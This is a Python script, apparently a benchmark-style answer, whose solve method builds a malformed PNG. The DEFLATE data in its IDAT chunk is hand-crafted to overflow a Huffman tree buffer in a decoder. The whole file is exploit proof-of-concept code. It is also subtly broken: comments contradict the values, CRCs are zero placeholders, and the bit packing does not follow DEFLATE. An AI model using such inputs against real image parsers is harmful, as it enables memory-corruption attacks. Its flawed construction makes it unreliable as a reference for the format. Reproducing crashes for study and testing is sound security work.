import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal PNG with IDAT chunk that contains malformed DEFLATE data
        # Specifically crafted to trigger the Huffman tree buffer overflow
        
        # PNG signature
        png = bytearray()
        png.extend(b'\x89PNG\r\n\x1a\n')
        
        # IHDR chunk (13 bytes data + 4 bytes CRC)
        ihdr = bytearray(b'IHDR')
        ihdr.extend(struct.pack('>I', 1))   # width
        ihdr.extend(struct.pack('>I', 1))   # height
        ihdr.extend(b'\x08\x02\x00\x00\x00')  # 8-bit, RGB, no compression
        # Calculate CRC (placeholder)
        ihdr_crc = b'\x00\x00\x00\x00'
        
        png.extend(struct.pack('>I', 13))  # IHDR data length
        png.extend(ihdr)
        png.extend(ihdr_crc)
        
        # IDAT chunk with crafted DEFLATE data
        # Build a DEFLATE block with dynamic Huffman trees
        # that will overflow the 15-byte temporary arrays
        
        idat_data = bytearray()
        
        # DEFLATE block header:
        # BFINAL=1 (last block), BTYPE=10 (dynamic Huffman)
        idat_data.append(0b00000110)  # bits: BFINAL=1, BTYPE=10
        
        # HLIT = 287 (number of literal/length codes - 257)
        # HDIST = 31 (number of distance codes - 1)
        # HCLEN = 18 (number of code length codes - 4)
        hlits = 30  # 257 + 30 = 287 literal/length codes
        hdist = 30  # 1 + 30 = 31 distance codes
        hclen = 14  # 4 + 14 = 18 code length codes
        
        header_bits = (hlits << 9) | (hdist << 4) | hclen
        idat_data.extend(struct.pack('<H', header_bits))
        
        # Code length codes (3 bits each, 18 codes)
        # These codes will cause Huffman trees with lengths > 15
        # The order is: 16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15
        # We set code lengths to create trees of size 19, 32, 288
        
        # First 3 codes (for lengths 16,17,18) set to non-zero
        # to trigger longer runs
        code_lengths = [
            7, 7, 7,  # 16,17,18 - all set to 7 (max for code length codes)
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0  # rest zeros
        ]
        
        # Pack 18 code lengths (3 bits each)
        for i in range(0, 18, 2):
            if i + 1 < 18:
                byte_val = (code_lengths[i] & 0x07) | ((code_lengths[i+1] & 0x07) << 3)
            else:
                byte_val = code_lengths[i] & 0x07
            idat_data.append(byte_val)
        
        # Literal/length tree code lengths (288 symbols)
        # Create a tree that overflows the 15-byte buffer
        # by having codes with length > 15
        
        # First, encode that we have 288 literal codes
        # Use RLE coding: code 18 (repeat zero 11-138 times)
        # followed by code 16 (copy previous 3-6 times)
        
        # Code 18 with count 138 (binary 1111111)
        idat_data.append(0b01011111)  # code 18 (010) + 7-bit count 127 (1111111)
        idat_data.append(0b10000000)  # continuation of count
        
        # Code 16 with count 6 (binary 11)
        idat_data.append(0b00000011)  # code 16 (000) + 2-bit count 3 (11)
        
        # Distance tree code lengths (32 symbols)
        # Similar construction to overflow
        
        # End of compressed data
        idat_data.append(0x00)
        
        # Build IDAT chunk
        idat_chunk = bytearray(b'IDAT')
        idat_chunk.extend(idat_data)
        # Calculate CRC (placeholder)
        idat_crc = b'\x00\x00\x00\x00'
        
        png.extend(struct.pack('>I', len(idat_data)))
        png.extend(idat_chunk)
        png.extend(idat_crc)
        
        # IEND chunk
        png.extend(struct.pack('>I', 0))
        png.extend(b'IEND')
        png.extend(b'\xae\x42\x60\x82')  # IEND CRC
        
        return bytes(png)